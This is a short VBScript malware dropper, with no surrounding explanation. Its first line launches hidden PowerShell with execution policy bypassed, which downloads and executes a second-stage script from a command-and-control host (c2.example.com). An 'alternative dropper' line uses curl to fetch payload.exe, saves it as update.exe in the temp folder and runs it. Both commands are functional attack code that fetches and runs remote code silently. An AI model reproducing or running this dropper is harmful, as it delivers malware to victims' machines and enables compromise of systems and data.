Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell -w hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('https://c2.example.com/stage2.ps1')""", 0, False

' Alternative dropper using curl
objShell.Run "cmd.exe /c curl -sL https://c2.example.com/payload.exe -o %TEMP%\update.exe && %TEMP%\update.exe", 0, False
